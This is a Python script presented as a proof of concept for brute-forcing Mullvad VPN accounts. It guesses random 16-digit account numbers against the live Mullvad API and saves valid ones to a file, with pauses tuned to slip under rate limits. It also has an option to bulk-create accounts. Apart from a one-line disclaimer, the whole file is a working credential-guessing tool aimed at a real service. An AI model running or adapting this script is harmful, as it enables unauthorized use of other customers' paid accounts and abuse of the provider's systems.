# Mullvad VPN account brute force, proof of concept
# Do not use this script for unlawful or irresponsible purpose
# API rate limit is very sensitive, you must limit requests to approx. once every 300 seconds

import requests
import json
import random
from os import system, name
import time
from colorama import init, Fore, Style
init()

def cls():
    if name == "nt":
        system("cls")
    else: system("clear")
    
cls()

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Content-Type": "application/json",
}

def Random(n):
    start = 10**(n-1)
    end = (10**n)-1
    return random.randint(start, end)

def create_account():
    data = {}
    resp = requests.post("https://api.mullvad.net/www/accounts/", headers=headers, json=data)
    genj = json.loads(resp.text)
    print("ID: " + genj["account"]["pretty_token"])

def guess():
    n = 10
    randnum = Random(16)
    resps = requests.get("https://api.mullvad.net/www/accounts/" + str(randnum), headers=headers)
    if "auth_token" in resps.text:
        print("SUCCESSFUL ID: " + str(randnum))
        file1 = open("goodaccounts.txt","a")
        file1.write(str(randnum) + "\n")
        file1.close()
        print("Account number saved to goodaccounts.txt")
    elif resps.status_code == 503:
        print("Warning Rate limit broken! Pausing for 40 seconds")
        time.sleep(40)
    else:
        print(Fore.RED + "Invalid credential: " + Style.RESET_ALL + str(randnum))
        #print(resps.status_code)
        file2 = open("bad.txt","a")
        file2.write(str(randnum) + "\n")
        file2.close()

print(Fore.GREEN + '''
 ███▄    █  █    ██  ██▓     ██▓  ██▒   █▓ ▄▄▄      ▓█████▄ 
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒ ▓██░   █▒▒████▄    ▒██▀ ██▌
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░  ▓██  █▒░▒██  ▀█▄  ░██   █▌
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░   ▒██ █░░░██▄▄▄▄██ ░▓█▄   ▌
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒▀█░   ▓█   ▓██▒░▒████▓ 
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░░ ▐░   ▒▒   ▓▒█░ ▒▒▓  ▒ 
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░░    ▒   ▒▒ ░ ░ ▒  ▒ 
   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░     ░░    ░   ▒    ░ ░  ░ 
         ░    ░         ░  ░    ░  ░ by Mike E     ░  ░   ░    
                                      ░              ░      
''')
print(Style.RESET_ALL)

while True:
    print("[1] Account Creation")
    print("[2] Account Brute Force")
    choice = input("> ")
    if choice == "1":
        print()
        print("How many accounts do you want to create?")
        numgen = input("> ")
        print()
        for x in range(int(numgen)):
            create_account()
        print()

    elif choice == "2":
        print()
        print("How many account numbers to guess? Enter 0 to run indefinitely")
        num_of_guesses = input("> ")
        print()
        if int(num_of_guesses) == 0:
            try:
                while True:
                    guess()
                    time.sleep(301)
            except:
                print('Rate limited !!')
        if int(num_of_guesses) > 0:
            for i in range(int(num_of_guesses)):
                guess()
                time.sleep(600)
        print()

    else:
        print()
        print("Wrong choice! Enter 1 or 2:")
        print()
